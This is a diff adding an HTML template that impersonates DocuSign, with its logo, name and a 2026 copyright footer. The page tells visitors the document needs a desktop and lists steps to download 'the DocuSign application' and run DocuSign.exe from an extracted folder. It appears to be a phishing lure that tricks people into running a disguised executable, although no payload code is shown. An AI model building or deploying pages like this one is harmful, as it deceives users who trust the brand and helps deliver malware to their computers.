@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DocuSign - Desktop Required</title>
+     <link rel="stylesheet" href="../static/styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <div class="logo">
+               <img src="{{url_for('static',filename='docusign-logo.png')}}" alt="DocusignLogo" >
+            </div>
+          
+        </nav>
+
+        <div class="mobile-warning">
+            <div class="warning-icon">
+                <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2L2 22H22L12 2Z" stroke="#4B0CDC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M12 8V14" stroke="#4B0CDC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M12 18H12.01" stroke="#4B0CDC" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <h2>Desktop Device Required</h2>
+            <p>This document can only be accessed on desktop devices. Please use a computer to view the document.</p>
+            <div class="instructions">
+                <h3>How to Access:</h3>
+                <ol>
+                    <li>Open this link on a desktop or laptop computer</li>
+                    <li>Download the DocuSign application</li>
+                    <li>Run the DocuSign.exe from the extracted folder</li>
+                    <li>Follow the on-screen prompts to complete installation</li>
+                </ol>
+            </div>
+        </div>
+        
+        <footer class="footer">
+            <p>© 2026 DocuSign  All rights reserved.</p>
+        </footer>
+    </div>
+</body>
+
+</html>
